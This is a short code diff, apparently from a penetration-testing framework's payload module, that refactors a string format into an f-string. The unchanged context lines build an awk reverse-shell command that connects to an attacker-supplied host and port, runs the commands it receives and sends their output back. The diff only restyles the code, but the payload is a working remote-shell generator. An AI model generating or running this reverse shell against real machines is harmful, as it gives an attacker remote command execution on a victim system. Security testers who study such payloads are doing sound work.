@@ -18,7 +18,7 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
         return (
             self.cmd +
             " 'BEGIN{s=\"/inet/tcp/0/" +
-            "{}/{}".format(self.lhost, self.lport) +
+            f"{self.lhost}/{self.lport}" +
             "\";for(;s|&getline c;close(c))" +
             "while(c|getline)print|&s;close(s)};'"
         )
